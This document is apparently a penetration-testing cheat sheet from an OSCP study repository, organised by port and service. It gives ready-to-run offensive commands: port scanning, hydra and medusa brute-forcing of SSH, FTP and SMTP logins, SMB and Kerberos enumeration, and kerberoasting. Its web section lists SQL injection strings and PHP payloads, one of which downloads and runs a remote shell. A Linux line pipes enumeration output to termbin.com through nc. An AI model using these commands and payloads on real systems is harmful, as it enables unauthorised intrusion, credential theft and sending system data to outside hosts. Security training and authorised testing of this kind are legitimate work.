<p align="center">
 <b>:panda_face: :panda_face: :panda_face: D4nk0St0rM :panda_face: :panda_face: :panda_face: </b>
</p>
<p align="center">
     <i><b>spread l0v3, share kn0wl3dge</b></i>

</p>

# General method & approach


## initial scanning
 
* ### /dev/tcp & nc
```
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 $IP_ADD $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done

top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do (echo > /dev/tcp/$IP_ADD/"$i") > /dev/null 2>&1 && echo "Port $i is open" || echo "Port $i is closed"; done
```
* ### masscan
```
masscan -p 1-65535 --rate 2000
masscan  -p U:1-65535 --rate 2000
# use -e tun0  for specific network connection
```


* ### nmap 

```
sudo nmap -sV -sC
sudo nmap -vvv -p-
sudo nmap --script='banner,vuln' -sV -sC
sudo nmap -sU -vvv
sudo nmap -Pn -p- --open -T4
sudo nmap -sT
```
> #### grepping open ports from -oA
```
awk '{for(i=5;i<=NF;i++)if($i~"/open/"){sub("/.*","",$i); print $2" "$i}}'
```


## port discovery & enum

* ### 21 FTP
```
sudo nmap -sV --script='ftp-vuln*,ftp-enum*,ftp-anon*' -p 21 -vvv
sudo nmap --script='ftp-vsftpd-backdoor,ftp-syst' -p 21

```
> bruteforce
```
hydra -L USER_LIST -P PASS_LIST -f -o ftphydra.txt -u $IP_ADD -s 21 ftp
```

* ### 22 SSH
>  bruteforce
```
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt -t 10 $IP_ADD ssh -s 22
medusa -u USER -P /usr/share/wordlists/rockyou.txt -e ns -h $IP_ADD:22 - 22 -M ssh
```
> #### SSH Tunnels

* [Guide to SSH Tunnels and Proxies](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

> #### known hosts dehash

* [python  script](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/tree/main/scripts/known_hosts_converter)


* ### 23 Telnet
* ### 25 SMTP
> nmap

```
sudo nmap --script='smtp-enum-users' -p 25 $IP_ADD
```
> connecting

```
nc -nv $IP_ADD 25
HELO a
EXPN root	-Enumeration
VRFY user	-Enumeration
# mail
MAIL FROM:user
RCPT TO:user
DATA Hello
.
```
> brute force
```
hydra -P /usr/share/wordlistsnmap.lst $IP_ADD smtp -V
```

> scripts / links

* [smtp_connect.py](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/scripts/smtp_connect.py)
* [pentestmonkey smtp user enumeration](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)


* #### 53 DNS
```
dig axfr DOMAIN @$IP_ADD
host DOMAIN
host -t ns DOMAIN
host -t axfr  DOMAIN NAMESERVER
host -l DOMAIN NAMESERVER
dnsenum --noreverse DOMAIN
dnsrecon -d DOMAIN

```
> nmap
```
sudo nmap -T4 -p 53 --script='dns-brute'

```

> links
* [dnsdumpster](https://dnsdumpster.com/)
* [netcraft](https://searchdns.netcraft.com)




* ### 80/443 HTTP

> #### spider
```
wget --spider -r http://IP_ADD 2>&1 | grep '^--' | awk '{ print $3 }' | grep -v '\.\(css\|js\|png\|gif\|jpg\)$' > urls.wget
```

```
sudo nmap --script=http-title
sudo nmap --script=http-headers
sudo nmap --script=http-enum
```
>  #### Browsing
```
robots.txt
# when robots.txt is accessable only by bot scans
curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')" http://website/robots.txt
# wappalyzer
# javascript
# view source
# firefox / chrome Dev Tools
# whatweb
```
> #### Scanning
```
gobuster dir --url http://....:.... -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.aspx -o gobuster.out
dirb
dirbuster
wpscan
nikto -C all -host

```
> burp

```
# php wrapper
<?php  $output = shell_exec(' ....'); echo "<pre>$output</pre>";  ?>
GET /thefile.php?variable=php://input

<?php system("wget <http://....../my_shell.txt -O /tmp/my_shell.php;php /tmp/my_shell.php");?>
GET /THE/PATH/TO/VULN.php?vuln=../../../../../../../../../path/to/your/new/database/something.php

```

> #### SQL injection

```
' or '1' ='1' --
' or '1'='1
searchterm OR 1=1-
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
OR 3=3;#
OR 2=2 LIMIT 1;
OR 'a'='a
OR 1=1 --+
https://TARGET.COM/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1
https://TARGET.COM/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--
http://TARGET.COM/index.php?id=2%20union%20all%20select%201,%202,%20@@version

curl -i -s -k -X $'POST' \\n    -H $'Host: $IP_ADD:PORT' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 26' -H $'Origin: http://10.11.1.128:4167' -H $'Connection: close' -H $'Referer: http://$IP_ADD:PORT/search.asp' -H $'Upgrade-Insecure-Requests: 1' \\n    -b $'SESSIONCOOKIE=COOOOOKIE' \\n    --data-binary $'\x0d\x0aartist=id=1 \'or\' 1 \'=\' 1' \\n    $'http://$IP_ADD:PORT/search.asp'

curl -i -s -k -X $'POST' -H $'Host: $IP_ADD:PORT' -H $'Origin: http://$IP_ADD:PORT' -H $'Connection: close' -H $'Referer: http://$IP_ADD:PORT/search.asp' -H $'Upgrade-Insecure-Requests: 1' -b $'ASPSESSIONIDQSQTTSQD=HAGFDELAABCPGKKBCNMKIFHI' --data-binary $'song=id=1 \'or\' 1 \'=\' 1' $'http://$IP_ADD:PORT/search.asp'
```

* #### 88 Kerberost
```
Rpcclient -U “” -N <IP>

Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=/root/Desktop/usernames.txt <IP>
```

> tools
* [kerbrute](https://github.com/ropnop/kerbrute)
* [GetNPUsers](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py)
* 

> kerberoast
```
# download service ticket
# sudo apt install kerberoast 
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-23a45000-USER@Server.com-CORP.COM.kirbi

```
> links

* [TCM Security - Kerberoasting domain accounts](https://tcm-sec.com/kerberoasting-domain-accounts/?utm_source=rss&utm_medium=rss&utm_campaign=kerberoasting-domain-accounts)
* [Pentest Partners - How to kerberoast like a boss](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)


* #### 110 POP3
```
* pop3 alt port
```
* #### 111 NFS
```
nmap -p 111 --script='nfs*'
```

* #### 123 NTP
* #### 135 RPC
* #### 139/445 SMB

- [more detailed](detailed/smb.md)
- [eternalblue](https://redteamzone.com/EternalBlue/)

```
rpcinfo -p
sudo nmap --script='smb-vuln-ms17-010' -p 139,445 -vvv
sudo nmap --script='smb-vuln*,smb-enum*,smb-mbenum*' -p 139,445 -vvv
enum4linux -a
smbclient --no-pass -c 'recurse;ls' ////IP_ADD//ADMIN$
smbclient -L IP_ADD --shares
smbclient -L IP_ADD --pass-pol
smbmap -H IP_ADD -u anonymous
crackmapexec smb IP_ADD --shares

* smbpasswd
* mount smb
* enum shares
* smbget
* rpcclient
  * rpclient help
  * enum printers
  * bash query RID

```
* #### 143 IMAP
* #### 161 SNMP
* #### 389/3269 LDAP
* #### 554 RTSP
* #### 593 RPC over HTTP
* #### 631 Printers
* #### 636 LDAP
* #### 1056 Trojan / Virus
* #### 1433 SQL
```
* SQLMAP
```
* #### 1521 Oracle
* #### 2049 NFS
```
* show mount
```
* #### 3306 MYSQL
```
* msfconsole
* SQLMAP
* mysql with creds
```
* #### 3389 RDP
```
* xfreerdo
* remmina
```

* #### 5901 VNC
* #### 5985 WinRM
- [pywinrm](https://github.com/diyan/pywinrm)

```
* crackmapexec winrm
* Evil-WinRM
```
* #### 6379 REDIS

* #### 8080 Web Servers
```
* HttpFileServer HFS
* Jenkins/Jetty
* Tomcat
```




## Initial foothold

## Inside with foothold - enumeration

### linux
```
# output linpeas to termbin with nc if available
./linPeas.sh | nc termbin.com 9999

# list applications
find / -user root -perm -4000 -exec ls -ldb {} \;
 
```
> links

* [dirty cow check](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/scripts/dirtycow_check.sh)
 
 

### windows
 ```
 # win 8.3 notation
dir /a /s /b > c:\tmp\myfile.txt
for /F "usebackq tokens=*" %A in ("c:\tmp\myfile.txt") do @echo %~sA >> c:\tmp\eightpointthree.txt

 
 ```
 

 ### general
```
# output linpeas to JSON
https://github.com/carlospolop/PEASS-ng/tree/master/parser

```

## Buffer Overflow

* [noobsec](https://www.noobsec.net/bof/)








* * *
#### :panda_face: Credits & thanks for the many resources out there supporting the OSCP journey:
including (not exhaustive):
* * *
- tjnull
- ippsec
- cybermentor
- abatchy
- scund00r
- 21y4d
- redteamtutorials
- noobsec
- hacktricks
- mjkranch
- sans.org
- htb
- vhl
- g0tm1lk
- @Rainsec_
- Arr0way

* [More linked here](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/other_resources/README.md)
others linked where appropriate in files

* * *


